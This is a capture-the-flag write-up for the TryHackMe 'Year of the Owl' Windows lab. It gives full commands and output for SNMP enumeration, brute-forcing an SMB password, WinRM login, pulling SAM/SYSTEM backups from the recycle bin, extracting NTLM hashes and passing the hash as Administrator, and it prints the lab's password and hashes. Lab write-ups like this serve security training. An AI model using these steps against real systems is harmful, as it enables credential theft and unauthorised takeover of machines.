# [Year of the Owl](https://tryhackme.com/room/yearoftheowl)

## The foolish owl sits on his throne...

# Flags

## When the labyrinth is before you and you lose your way, sometimes thinking outside the walls is the way forward.

### User Flag

1. First, we perform a comprehensive port scan to identify open services on the target machine.

```bash
nmap -sV -p- <TARGET_IP>
```

**Results:**

```
PORT      STATE SERVICE       VERSION
80/tcp    open  http          Apache httpd 2.4.46 ((Win64) OpenSSL/1.1.1g PHP/7.4.10)
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
443/tcp   open  ssl/http      Apache httpd 2.4.46 ((Win64) OpenSSL/1.1.1g PHP/7.4.10)
445/tcp   open  microsoft-ds?
3306/tcp  open  mysql         MariaDB 10.3.24 or later (unauthorized)
3389/tcp  open  ms-wbt-server Microsoft Terminal Services
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
47001/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
```

2. Since standard ports didn't reveal immediate access, we enumerate SNMP community strings to gain additional information about the system.

```bash
onesixtyone <TARGET_IP> -c /usr/share/seclists/Discovery/SNMP/snmp-onesixtyone.txt
```

**Results:**

```
Scanning 1 hosts, 3218 communities
<TARGET_IP> [openview] Hardware: Intel64 Family 6 Model 79 Stepping 1 AT/AT COMPATIBLE - Software: Windows Version 6.3 (Build 17763 Multiprocessor Free)
```

3. Using the discovered community string, we enumerate user accounts via SNMP by querying the Windows user list OID.

```bash
snmpwalk -c openview -v1 <TARGET_IP> 1.3.6.1.4.1.77.1.2.25
```

**Results:**

```
Created directory: /var/lib/snmp/cert_indexes
iso.3.6.1.4.1.77.1.2.25.1.1.5.71.117.101.115.116 = STRING: "Guest"
iso.3.6.1.4.1.77.1.2.25.1.1.6.74.97.114.101.116.104 = STRING: "Jareth"
iso.3.6.1.4.1.77.1.2.25.1.1.13.65.100.109.105.110.105.115.116.114.97.116.111.114 = STRING: "Administrator"
iso.3.6.1.4.1.77.1.2.25.1.1.14.68.101.102.97.117.108.116.65.99.99.111.117.110.116 = STRING: "DefaultAccount"
iso.3.6.1.4.1.77.1.2.25.1.1.18.87.68.65.71.85.116.105.108.105.116.121.65.99.99.111.117.110.116 = STRING: "WDAGUtilityAccount"
```

4. With the username `Jareth` identified, we attempt to brute force the SMB password using CrackMapExec and the rockyou wordlist.

```bash
crackmapexec smb <TARGET_IP> -u Jareth -p /usr/share/wordlists/rockyou.txt
```

<img width="903" height="607" alt="SCREEN01" src="https://github.com/user-attachments/assets/5793afb8-b7e9-4eee-8637-e25c414a234c" />

5. Using the discovered credentials, we establish a remote PowerShell session via WinRM.

```bash
evil-winrm -u Jareth -p sarah -i <TARGET_IP>
```

6. Navigate to the user's desktop and read the user flag.

```bash
dir C:\Users\Jareth\Desktop
more C:\Users\Jareth\Desktop\user.txt
```

<img width="1039" height="419" alt="SCREEN02" src="https://github.com/user-attachments/assets/c9fc8e90-9f37-4ed9-becc-d2ab640e1fd3" />

---

### Admin Flag

1. To locate user-specific recycle bin directories, we need to find Jareth's Security Identifier (SID).

```bash
whoami /all | Select-String -Pattern "jareth" -Context 2,0
```

**Results:**

```
  User Name              SID
  ====================== =============================================
> year-of-the-owl\jareth S-1-5-21-1987495829-1628902820-919763334-1001
```

2. Navigate to the recycle bin directory using the discovered SID. The recycle bin path follows the pattern: `C:\$Recycle.bin\<SID>`.

```bash
cd 'C:\$Recycle.bin\S-1-5-21-1987495829-1628902820-919763334-1001'
dir
```

**Results:**

```
Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-a----        9/18/2020   7:28 PM          49152 sam.bak
-a----        9/18/2020   7:28 PM       17457152 system.bak
```

3. Copy the files to a writable directory and download them to our attacking machine for analysis.

```bash
copy sam.bak C:\Windows\Temp\sam.bak
copy system.bak C:\Windows\Temp\system.bak
cd C:\Windows\Temp
download sam.bak
download system.bak
```

4. Using the creddump7 toolkit, we extract NTLM password hashes from the downloaded registry hives.

```bash
git clone https://github.com/ict/creddump7.git && cd creddump7
pip3 install pycryptodome
python3 pwdump.py ../system.bak ../sam.bak
```

**Results:**

```bash
Administrator:500:aad3b435b51404eeaad3b435b51404ee:6bc99ede9edcfecf9662fb0c0ddcfa7a:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
WDAGUtilityAccount:504:aad3b435b51404eeaad3b435b51404ee:39a21b273f0cfd3d1541695564b4511b:::
Jareth:1001:aad3b435b51404eeaad3b435b51404ee:5a6103a83d2a94be8fd17161dfd4555a:::
```

5. Authenticate as Administrator using the extracted NTLM hash via WinRM.

```bash
evil-winrm -u Administrator -H 6bc99ede9edcfecf9662fb0c0ddcfa7a -i <TARGET_IP>
```

6. Navigate to the Administrator's desktop and read the admin flag.

```bash
dir C:\Users\Administrator\Desktop
more C:\Users\Administrator\Desktop\admin.txt
```

<img width="790" height="246" alt="SCREEN03" src="https://github.com/user-attachments/assets/b5f52cea-68f4-4a18-b9cf-9dfbc1522e3e" />
